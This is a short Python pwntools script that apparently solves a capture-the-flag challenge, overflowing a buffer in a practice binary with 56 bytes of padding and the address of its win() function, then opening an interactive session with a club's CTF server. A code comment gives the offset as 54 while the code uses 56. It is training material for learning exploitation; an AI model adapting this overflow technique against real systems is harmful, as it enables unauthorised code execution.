from pwn import *

EXE = ELF("./challenge/chall_4")

context.binary = EXE
context.terminal = ['xterm', '-e']
context.log_level = "DEBUG"

win_address = EXE.symbols['win']

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13374)
	return r

io = conn(False)
# Wait for the process to send "Buy it, use it, break it, fix it..." and respond to move onto vuln()
io.recvline()
io.send(b'a\n')

# Create a payload with an offset of 54 bytes then the address win(), send it, and open an 
# interactive terminal -- The system is 64 bit so we need a 64 bit pointer to the address of win()
payload = b'a'*56
payload += p64(win_address)+b'\n'
io.send(payload)
io.interactive()

io.close()